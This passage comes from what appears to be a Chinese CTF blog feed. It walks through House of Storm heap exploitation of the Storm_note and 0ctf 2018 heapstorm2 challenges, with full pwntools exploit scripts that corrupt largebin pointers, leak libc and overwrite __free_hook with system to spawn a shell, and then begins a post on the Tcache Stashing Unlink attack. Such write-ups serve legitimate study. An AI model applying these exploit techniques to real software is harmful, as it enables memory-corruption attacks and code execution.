add(0x4d8)#8 0x5a0
free(4)
free(5)
add(0x40)#4 0x580
</code></pre>
<p>之后free(2)，放入unsortedbin</p>
<pre><code>free(2)    

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/77c5a9870baa4026bff5f9628c03ba04.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/77c5a9870baa4026bff5f9628c03ba04.png?ynotemdtimestamp=1663776442613" alt="img"><br>再申请回来0x4e8（0x4f0）大小的chunk，使0x4e0大小的chunk进入largebin</p>
<pre><code>add(0x4e8)      # put chunk8(0x5c0) to largebin

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/a37cfa88b26d4999b0b0317fc9d111fa.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/a37cfa88b26d4999b0b0317fc9d111fa.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>再次free(2)，构造一个unsortedbin chunk和一个largebin chunk</p>
<pre><code>free(2) #put chunk2 to unsortedbin

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/c0e50b9fc3c149718a85e6b75b358153.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/c0e50b9fc3c149718a85e6b75b358153.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>之后利用刚才构造的堆块重叠，修改unsortedbin chunk的bk指针为目标地址（target-0x20）</p>
<pre><code>target = 0xabcd0100
fake_chunk = target - 0x20

payload = p64(0)*2 + p64(0) + p64(0x4f1) # size
payload += p64(0) + p64(fake_chunk)      # bk
edit(7,payload)

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/7bbc8214b1b0476398f502ea56f09b2c.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/7bbc8214b1b0476398f502ea56f09b2c.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/04851cb22b004a94ba30521980d47ec0.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/04851cb22b004a94ba30521980d47ec0.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>之后利用刚才构造的堆块重叠，修改largebin chunk的bk指针和bk_nextsize指针分别为fake_chunk+8，和fake_chunk-0x18-5</p>
<pre><code>payload2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
payload2 += p64(0) + p64(fake_chunk+8)   
payload2 += p64(0) + p64(fake_chunk-0x18-5)#mmap

edit(8,payload2)

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/069a9ee48f35474e9a26769b36036e38.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/069a9ee48f35474e9a26769b36036e38.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/f419df60e7804ce282eda0636ae98979.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/f419df60e7804ce282eda0636ae98979.png?ynotemdtimestamp=1663776442613" alt="img"><br>然后申请0x40（0x50）大小的chunk，可以看到在目标地址处0xabcd00e0成功伪造fake chunk，size为0x56，巧妙的实现victim-&gt;bk_nextsize-&gt;fd_nextsize = victim</p>
<pre><code>add(0x40)

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/950899dc8f374c7387c8f6923d8d813d.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/950899dc8f374c7387c8f6923d8d813d.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>之后就是把0xABCD0100处的0x30个字节改为已知数，然后获得shell</p>
<pre><code>payload = '\x00'*(0x10+0x30)
edit(2,payload)

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/65914edb5d2a4b28818664c8e045bbb9.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/65914edb5d2a4b28818664c8e045bbb9.png?ynotemdtimestamp=1663776442613" alt="img"></p>
<pre><code>    sla('Choice: ','666')
    s(p64(0)*6)
    itr()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/c88e75a6f70c4602a715c19022ed53fd.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/c88e75a6f70c4602a715c19022ed53fd.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code># coding=utf-8
from pwn import *
#context(endian='little',os='linux',arch='amd64',log_level='debug')
sh = process('./Storm_note')

s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
r       = lambda num=4096           :sh.recv(num)
ru      = lambda delims		    :sh.recvuntil(delims)
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
def dbg():
        gdb.attach(sh)
        pause()


def add(size):
  sla('Choice','1')
  sla('?',str(size))

def edit(index,text):
  sla('Choice','2')
  sla('?',str(index))
  sa('Content',text)

def free(index):
  sla('Choice','3')
  sla('?',str(index))
#---------------布置chunk-------------------------#
add(0x18)#0
add(0x508)#1
add(0x18)#2

add(0x18)#3
add(0x508)#4
add(0x18)#5

add(0x18)#6


#dbg()
#构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。
edit(1,'a'*0x4f0+p64(0x500)) 
edit(4,'a'*0x4f0+p64(0x500)) 

#dbg()
#----------------准备 unsorted chunk-----------------------#
free(1)
edit(0,'a'*0x18)#off-by-null改写chunk1的size为0x500

#dbg()

add(0x18)#1
add(0x4d8)#7  

free(1)
free(2)    

#dbg()

#recover
add(0x30)#1 此时chunk7可以控制原 （unsortedbin chunk  0x4f1）的bk指针
add(0x4e0)#2
#-------------------准备 large chunk-----------------------------------#
#dbg()
#下面同理获得chunk8可以控制原 （largebin chunk 0x4e1 ）的bk指针和bk_nextsize指针
free(4)
edit(3,'a'*0x18)#off by null
add(0x18)#4
add(0x4d8)#8 0x5a0
free(4)
free(5)
add(0x40)#4 0x580

 #---------------unsorted chunk 和 large chunk 放到对应位置----------------------#
free(2)    #unsortedbin-&gt; chunk2 -&gt; chunk5(chunk8)(0x5c0)    which size is largebin FIFO
 
#dbg()
#
add(0x4e8)      # put chunk8(0x5c0) to largebin

#dbg()

free(2) #put chunk2 to unsortedbin

#dbg()
 #--------------修改他们是的满足条件进行 house of strom------------------------------#
target = 0xabcd0100
fake_chunk = target - 0x20

payload = p64(0)*2 + p64(0) + p64(0x4f1) # size
payload += p64(0) + p64(fake_chunk)      # bk
edit(7,payload)

#dbg()

payload2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
payload2 += p64(0) + p64(fake_chunk+8)   
payload2 += p64(0) + p64(fake_chunk-0x18-5)#mmap

edit(8,payload2)

#dbg()

add(0x40)

#dbg()

payload = '\x00'*(0x10+0x30)
edit(2,payload)

#dbg()

sla('Choice: ','666')
s(p64(0)*6)
itr()
</code></pre>
<h3 id="0ctf-2018-heapstorm2"><a href="#0ctf-2018-heapstorm2" class="headerlink" title="0ctf_2018_heapstorm2"></a>0ctf_2018_heapstorm2</h3><p class='item-img' data-src='https://img-blog.csdnimg.cn/13f92447a47b42a68e668fd3bb4f835f.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/13f92447a47b42a68e668fd3bb4f835f.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>同样是保护全开，</p>
<h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p>实现四个功能，增删改查</p>
<pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 v4; // [rsp+8h] [rbp-8h]   	//v4=0x13370800

  v4 = sub_BE6();

  while ( 1 )
  {
    menu();
    switch ( chioce(a1, a2) )
    {
      case 1LL:
        a1 = v4;
        add(v4);
        break;
      case 2LL:
        a1 = v4;
        up(v4);
        break;
      case 3LL:
        a1 = v4;
        delete(v4);
        break;
      case 4LL:
        a1 = v4;
        show(v4);
        break;
      case 5LL:
        return 0LL;
      default:
        continue;
    }
  }
}
</code></pre>
<p>主函数里有个sub_BE6()函数，其中禁用了fastbin，并且用mmap在0x13370000处分配了大小为0x1000的chunk，从/dev/urandom中读取了3个随机数到0x13370800处，还调用了两个异或函数，由后面可知，是对chunk的头指针和size进行了异或加密，返回0x13370800给v4，这里相当于有四个随机数，第三个和第四个随机数相同</p>
<pre><code>__int64 sub_BE6()
{
  int i; // [rsp+8h] [rbp-18h]
  int fd; // [rsp+Ch] [rbp-14h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  alarm(0x3Cu);
  puts(
    "    __ __ _____________   __   __    ___    ____\n"
    "   / //_// ____/ ____/ | / /  / /   /   |  / __ )\n"
    "  / ,&lt;  / __/ / __/ /  |/ /  / /   / /| | / __  |\n"
    " / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /\n"
    "/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/\n");
  puts("===== HEAP STORM II =====");
  if ( !mallopt(1, 0) )                         // 禁用fastbin
    exit(-1);
  if ( mmap(0x13370000, 0x1000uLL, 3, 34, -1, 0LL) != 322371584 )
    exit(-1);
  fd = open("/dev/urandom", 0);
  if ( fd &lt; 0 )
    exit(-1);
  if ( read(fd, 0x13370800, 0x18uLL) != 24 )
    exit(-1);
  close(fd);
  MEMORY[0x13370818] = MEMORY[0x13370810];
  for ( i = 0; i &lt;= 15; ++i )
  {
    *(16 * (i + 2LL) + 0x13370800) = ptr_xor(0x13370800, 0LL);
    *(16 * (i + 2LL) + 0x13370808) = size_xor(0x13370800LL, 0LL);
  }
  return 0x13370800LL;
}
</code></pre>
<h4 id="ptr-xor"><a href="#ptr-xor" class="headerlink" title="ptr_xor()"></a>ptr_xor()</h4><pre><code>__int64 __fastcall ptr_xor(_QWORD *a1, __int64 a2)
{
  return *a1 ^ a2;     //a1为第一个随机数
}
</code></pre>
<h4 id="size-xor"><a href="#size-xor" class="headerlink" title="size_xor()"></a>size_xor()</h4><pre><code>__int64 __fastcall size_xor(__int64 a1, __int64 a2)
{
  return a2 ^ *(a1 + 8);	//a1+8为第一个随机数
}
</code></pre>
<p>readd函数存在一个off-by-one</p>
<pre><code>unsigned __int64 __fastcall sub_1402(__int64 a1, __int64 a2)
{
  __int64 v3; // rax
  char buf; // [rsp+17h] [rbp-19h] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-18h]
  ssize_t v6; // [rsp+20h] [rbp-10h]
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  if ( !a2 )
    return 0LL;
  v5 = 0LL;
  while ( a2 - 1 &gt; v5 )
  {
    v6 = read(0, &amp;buf, 1uLL);
    if ( v6 &gt; 0 )
    {
      if ( buf == 10 )
        break;
      v3 = v5++;
      *(v3 + a1) = buf;
    }
    else if ( *_errno_location() != 11 &amp;&amp; *_errno_location() != 4 )
    {
      break;
    }
  }
  *(a1 + v5) = 0;                               // off-by-null
  return v5;
}
</code></pre>
<p>add函数<br>只能申请0xC 到0x1000的chunk，且chunk的头指针和size用 了异或加密，由上面的异或函数可知只是用了前两个随机数,并且我们看到chunk的头指针和size是 在0x13370800+4*0x8处开始存放的，按照mem指针+size顺序依次存放</p>
<pre><code>void __fastcall add(__int64 a1)
{
  int i; // [rsp+10h] [rbp-10h]
  int size; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i &lt;= 15; ++i )
  {
    if ( !size_xor(a1, *(16 * (i + 2LL) + a1 + 8)) )
    {
      printf("Size: ");
      size = chioce();
      if ( size &gt; 12 &amp;&amp; size &lt;= 4096 )
      {
        v3 = calloc(size, 1uLL);
        if ( !v3 )
          exit(-1);
        *(16 * (i + 2LL) + a1 + 8) = size_xor(a1, size);
        *(16 * (i + 2LL) + a1) = ptr_xor(a1, v3);
        printf("Chunk %d Allocated\n", i);
      }
      else
      {
        puts("Invalid Size");
      }
      return;
    }
  }
}
</code></pre>
<h4 id="edit函数-1"><a href="#edit函数-1" class="headerlink" title="edit函数"></a>edit函数</h4><p>读入的数据+12要小于等于申请时写的size,我们读入的数据会追加上一个12字节字符串再加上一个0结尾，所以存在off_by_null但是prev_size无法控制。</p>
<pre><code>int __fastcall edit(_QWORD *a1)
{
  signed int v2; // [rsp+10h] [rbp-20h]
  int v3; // [rsp+14h] [rbp-1Ch]
  __int64 v4; // [rsp+18h] [rbp-18h]

  printf("Index: ");
  v2 = chioce();
  if ( v2 &gt; 0xF || !size_xor(a1, a1[2 * v2 + 5]) )
    return puts("Invalid Index");
  printf("Size: ");
  v3 = chioce();
  if ( v3 &lt;= 0 || v3 &gt; (size_xor(a1, a1[2 * v2 + 5]) - 12) )
    return puts("Invalid Size");
  printf("Content: ");
  v4 = ptr_xor(a1, a1[2 * v2 + 4]);
  sub_1377(v4, v3);
  strcpy((v3 + v4), "HEAPSTORM_II");
  return printf("Chunk %d Updated\n", v2);
}
</code></pre>
<h4 id="free函数-1"><a href="#free函数-1" class="headerlink" title="free函数"></a>free函数</h4><p>不存在uaf</p>
<pre><code>int __fastcall sub_109B(_QWORD *a1)
{
  void *v2; // rax
  signed int v3; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  v3 = chioce();
  if ( v3 &gt; 0xF || !size_xor(a1, a1[2 * v3 + 5]) )
    return puts("Invalid Index");
  v2 = ptr_xor(a1, a1[2 * v3 + 4]);
  free(v2);
  a1[2 * v3 + 4] = ptr_xor(a1, 0LL);
  a1[2 * v3 + 5] = size_xor(a1, 0LL);
  return printf("Chunk %d Deleted\n", v3);
}
</code></pre>
<h4 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h4><p>需要满足 (a1[3] ^ a1[2]) == 0x13377331才能使用该函数，也就是第2个随机数和第3个随机数异或后为0x13377331才行</p>
<pre><code>    int __fastcall sub_11B5(_QWORD *a1)
{
  __int64 v2; // rbx
  __int64 v3; // rax
  signed int v4; // [rsp+1Ch] [rbp-14h]

  if ( (a1[3] ^ a1[2]) != 0x13377331LL )
    return puts("Permission denied");
  printf("Index: ");
  v4 = chioce();
  if ( v4 &gt; 0xF || !size_xor(a1, a1[2 * v4 + 5]) )
    return puts("Invalid Index");
  printf("Chunk[%d]: ", v4);
  v2 = size_xor(a1, a1[2 * v4 + 5]);
  v3 = ptr_xor(a1, a1[2 * v4 + 4]);
  sub_14D4(v3, v2);
  return puts(byte_180A);
}
</code></pre>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目保护全开，我们想到的是把free_hook改为system地址，而我们首先得泄露出libc基地址，就必须利用show函数，要想利用show函数，就必须修改第3个随机数和第4个随机数的值，使它们异或后为0x13377331，随机数是在0x13370800处，我们就想到要将chunk分配到0x13370800处，程序允许我们分配最大0x1000大小的chunk，可以使用House of storm来将chunk分配到0x13370800处，这样我们不仅控制了四个随机数，还控制了chunk的全局数组</p>
<h3 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h3><p>先把前面的东西写好</p>
<pre><code>#coding:utf-8
from pwn import *
context(endian='little',os='linux',arch='amd64',log_level='debug')
sh = process('./0ctf_2018_heapstorm2')
libc = ELF('./libc-2.23.so')
#命令简写化
s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim,data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim,data)
r       = lambda num=4096           :sh.recv(num)
rl      = lambda num=4096           :sh.recvline(num)
ru      = lambda delims   :sh.recvuntil(delims )
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
def dbg():
    gdb.attach(sh)
    pause()
def add(size):
    sla('Command: ','1')
    sla('Size: ',str(size))  # 12&lt;size&lt;0x1000


def edit(idx,content):
    sla('Command: ','2')
    sla('Index: ',str(idx))
    sla('Size: ',str(len(content)))
    sa('Content: ',content)



def free(idx):
    sla('Command: ','3')
    sla('Index: ',str(idx))


def show(idx):
    sla('Command: ','4')
    sla('Index: ',str(idx))
</code></pre>
<p>和上一题一样，先构造一个unsortedbin和largebin，并且利用off-by-null来实现控制unsortedbin chunk的bk指针和largebin chunk的bk和bk_size指针，然后再malloc chunk，将chunk分配到0x13370800处，这里要注意的是这道题的edit函数有点不同，会把我们输入的字节后面加上12字节再加一个’\x00’，所以我们每次edit都要少输入12字节即可实现0ff-by-null。</p>
<pre><code>#---------------布置chunk-------------------------#
add(0x18)#0	   
add(0x508)#1
add(0x18)#2

add(0x18)#3   
add(0x508)#4
add(0x18)#5   

add(0x18)#6   

#----------------准备 unsorted chunk-----------------------#
edit(1,'\x00'*0x4F0+p64(0x500)) 
free(1)
edit(0,'\x00'*(0x18-12))
add(0x18) #1 
add(0x4d8) #7   

free(1)   
free(2) #1-2

add(0x38)#1
add(0x4e8)#2  

#-------------------准备 large chunk-----------------------------------#
edit(4,'\x00'*0x4F0+p64(0x500))
free(4)
edit(3,'\x00'*(0x18-12)) 
add(0x18) #4
add(0x4d8) #8

free(4)
free(5) #4-5 

add(0x48)#4  
#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#
free(2)
add(0x4e8) 
free(2) 
#--------------修改他们是的满足条件进行 house of strom------------------------------#
fake_chunk = 0x13370800 - 0x20
payload = '\x00' * 0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)
edit(7, payload) #修改unsorted chunk的bk

payload = '\x00' * 0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) + p64(0) + p64(fake_chunk-0x18-5)
edit(8, payload)  
add(0x48) 
</code></pre>
<p>现在我们已经可以控制0x13370800处的值了，我们把这些随机数都改为0，然后把chunk_0改为0x13370800，以此来实现控制</p>
<pre><code>#-----------------------泄漏 libc----------------------------------#
#由于bins中的chunk的fd,bk指向libc的地址，我们先要泄漏heap的地址

payload = p64(0)*6 + p64(0x13370800)
edit(2, payload) #修改了r0~r4为0，并且修改了chunk0的地址，此时的chunk0的size非常大，因为异或的是0

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/5f044d56d0c44edb8e660e12e3bcaed3.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/5f044d56d0c44edb8e660e12e3bcaed3.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/e14aefc2bf3441d7a953157a9dfcd27a.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/e14aefc2bf3441d7a953157a9dfcd27a.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/f0caae54a60245fc93f7b19db749773b.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/f0caae54a60245fc93f7b19db749773b.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p>
<p>之后修改0x13370800处的第三个和第四个数分别为0和0x13377331，两者异或得到0x13377331，越过show函数的检查，此时已经可以使用show函数，因为我们要泄露的unsortedbin chunk的fd指针（指向main_arena+88），我们必须在chunk的全局数组中写入0x56104462a060来show，但是程序每次运行地址不同，由上图可知fake_chunk+3处存放的就是0x56104462a060，<br>所以我们需要利用fake_chunk+3（unsortedbin chunk的地址）来泄露libc，我们每次把chunk0的位置写为0x13370800，就可以实现每次通过chunk0来控制0x13370800</p>
<pre><code>payload = p64(0)*3 +p64(0x13377331)  #满足show的条件
payload += p64(0x13370800) + p64(0x1000) #chunk0
payload += p64(fake_chunk+3) + p64(8)   #chunk1
edit(0, payload) #满足show的条件

show(1)  #我们刚刚house of storm 写的地址泄漏出来
ru("]: ")
heap = u64(r(6).ljust(8, '\x00'))
success("heap:"+hex(heap))

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/cf60539043db433c95bc3f6a7ac6caff.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/cf60539043db433c95bc3f6a7ac6caff.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/29c15a75b6b34ba1988f64a95bdcf946.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/29c15a75b6b34ba1988f64a95bdcf946.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>此时我们成功泄露出unsortedbin chunk的地址，我们再修改全局数组为unsortedbin chunk的地址+0x10（main_arena+88），然后即可泄露处libc基地址</p>
<pre><code>payload  = p64(0)*3 + p64(0x13377331)#满足show的条件
payload += p64(0x13370800) + p64(0x1000) #chunk0
payload += p64(heap+0x10) + p64(8) #chunk1
edit(0, payload)
show(1) #泄漏libc地址
ru("]: ")
malloc_hook = u64(r(6).ljust(8, '\x00')) -0x58 - 0x10
libc_base = malloc_hook - libc.sym['__malloc_hook']
free_hook = libc_base+libc.sym['__free_hook']
system = libc_base+ libc.sym['system']
success("free_hook:"+hex(free_hook))
dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/aed1148758fa403a88ce058db848df8b.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/aed1148758fa403a88ce058db848df8b.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p>
<p>之后我们要做到就是在全局数组里写入free hook地址和/bin/sh，将其改为system，获得shell，free_hook在chunk0处，/bin/sh\x00在chunk1处</p>
<pre><code>#--------------修改 free_hook -----------------------------------#
payload  = p64(0)*4
payload += p64(free_hook) + p64(0x100)#chunk0
payload += p64(0x13370800+0x40) + p64(8)#chunk1
payload += '/bin/sh\x00'
edit(0, payload)

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/bb966a3843c24bdcac635f1a1d52c453.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/bb966a3843c24bdcac635f1a1d52c453.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>之后改free_hook为system，free(1)，获得shell</p>
<pre><code>edit(0, p64(system))
free(1)

itr()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/96b6b52cd2734f3b8c13806244a0c5fe.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/96b6b52cd2734f3b8c13806244a0c5fe.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre><code>#coding:utf-8
from pwn import *
context(endian='little',os='linux',arch='amd64',log_level='debug')
sh = process('./0ctf_2018_heapstorm2')
libc = ELF('./libc-2.23.so')
#命令简写化
s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim,data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim,data)
r       = lambda num=4096           :sh.recv(num)
rl      = lambda num=4096           :sh.recvline(num)
ru      = lambda delims   :sh.recvuntil(delims )
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

def dbg():
        gdb.attach(sh)
        pause()
def add(size):

    sla('Command: ','1')
    sla('Size: ',str(size))  # 12&lt;size&lt;0x1000


def edit(idx,content):
    sla('Command: ','2')
    sla('Index: ',str(idx))
    sla('Size: ',str(len(content)))
    sa('Content: ',content)



def free(idx):
    sla('Command: ','3')
    sla('Index: ',str(idx))


def show(idx):
    sla('Command: ','4')
    sla('Index: ',str(idx))

#---------------布置chunk-------------------------#
add(0x18)#0	 
add(0x508)#1
add(0x18)#2

add(0x18)#3   
add(0x508)#4
add(0x18)#5   

add(0x18)#6  

#----------------准备 unsorted chunk-----------------------#
edit(1,'\x00'*0x4F0+p64(0x500)) 
free(1)
edit(0,'\x00'*(0x18-12))  
add(0x18) #1 
add(0x4d8) #7  

free(1)   
free(2) #1-2 合并  

add(0x38)#1
add(0x4e8)#2   

#-------------------准备 large chunk-----------------------------------#
edit(4,'\x00'*0x4F0+p64(0x500))#伪造chunk
free(4)
edit(3,'\x00'*(0x18-12)) 
add(0x18) #4
add(0x4d8) #8  

free(4)
free(5) #4-5 

add(0x48)#4  
#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#
free(2)
add(0x4e8) 
free(2)   
#--------------修改他们是的满足条件进行 house of strom------------------------------#
fake_chunk = 0x13370800 - 0x20
payload = '\x00' * 0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)
edit(7, payload) #修改unsorted chunk的bk

payload = '\x00' * 0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) + p64(0) + p64(fake_chunk-0x18-5)
edit(8, payload) #修改 large chunk 的 bk 和 bk_nextsize
add(0x48)  #2  -&gt; 0x133707e0   成功将申请到了heaparray附近

 

#-----------------------泄漏 libc----------------------------------#
#由于bins中的chunk的fd,bk指向libc的地址，我们先要泄漏heap的地址

payload = p64(0)*6 + p64(0x13370800)
edit(2, payload) #修改了r0~r4为0，并且修改了chunk0的地址，此时的chunk0的size非常大，因为异或的是0

#dbg()
 
payload = p64(0)*3 +p64(0x13377331)  #满足show的条件

payload += p64(0x13370800) + p64(0x1000) #chunk0
payload += p64(fake_chunk+3) + p64(8)   #chunk1
edit(0, payload) #满足show的条件

#dbg()

show(1)  #我们刚刚house of storm 写的地址泄漏出来
ru("]: ")
heap = u64(r(6).ljust(8, '\x00'))
success("heap:"+hex(heap))

#dbg()

payload  = p64(0)*3 + p64(0x13377331)#满足show的条件
payload += p64(0x13370800) + p64(0x1000) #chunk0
payload += p64(heap+0x10) + p64(8) #chunk1
edit(0, payload)

#dbg()

show(1) #泄漏libc地址
ru("]: ")
malloc_hook = u64(r(6).ljust(8, '\x00')) -0x58 - 0x10
libc_base = malloc_hook - libc.sym['__malloc_hook']
free_hook = libc_base+libc.sym['__free_hook']
system = libc_base+ libc.sym['system']
success("free_hook:"+hex(free_hook))
 
#--------------修改 free_hook -----------------------------------#
payload  = p64(0)*4
payload += p64(free_hook) + p64(0x100)#chunk0
payload += p64(0x13370800+0x40) + p64(8)#chunk1
payload += '/bin/sh\x00'
edit(0, payload)
#dbg()
edit(0, p64(system))
free(1)

itr()
</code></pre>
<blockquote>
<p>参考文章<br><a href="https://www.anquanke.com/post/id/203096">House of storm 原理及利用</a><br><a href="https://www.freebuf.com/articles/system/209096.html">Largebin Attack</a><br><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/">CTF-WIKI</a><br><a href="https://bbs.pediy.com/thread-262424.htm#msg_header_h1_2">Largebin attack总结</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>House of 系列</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2023/09/11/Tcache%20Stashing%20Unlink%20Attack(House%20of%20Lore%20Attack)/</url>
    <content><![CDATA[<p><strong>Tcache Stashing Unlink Attack利用了House of Lore的一些手段，两者都是利用了small bin</strong></p>
<h1 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h1><blockquote>
<p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。<br>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。<br>House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</p>
</blockquote>
<h1 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h1><blockquote>
<p>利用特性：<br>1.tcache bin中有剩余（数量小于TCACHE_MAX_BINS）时，同大小的small bin会放进tcache中<br>2.calloc函数分配堆块时不从tcache bin中选取。<br>3.修改一个small bin的bk指针时，就可以实现在任意地址上写一个libc地址，构造得当可以往任意地址申请chunk，实现任意地址写</p>
</blockquote>
<p>利用前提</p>
<pre><code>1.能控制 Small Bin Chunk 的 bk 指针。

2.程序可以越过Tache取Chunk。(使用calloc即可做到)

3.程序至少可以分配两种不同大小且大小为unsorted bin的Chunk。
</code></pre>
<h1 id="例题-BUUCTF-2020-新春红包题-3"><a href="#例题-BUUCTF-2020-新春红包题-3" class="headerlink" title="例题 BUUCTF-[2020 新春红包题]3"></a>例题 BUUCTF-[2020 新春红包题]3</h1><p class='item-img' data-src='https://img-blog.csdnimg.cn/1e5652dfa82c4d62aa48c5dfde30cbd7.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/1e5652dfa82c4d62aa48c5dfde30cbd7.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>未开启canary保护，可能存在栈溢出</p>
<h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><p>程序实现四个功能，增，删，查，改，还有一个栈溢出的函数</p>
<pre><code>void __fastcall __noreturn main(char *a1, char **a2, char **a3)
{
  char v3[268]; // [rsp+0h] [rbp-110h] BYREF
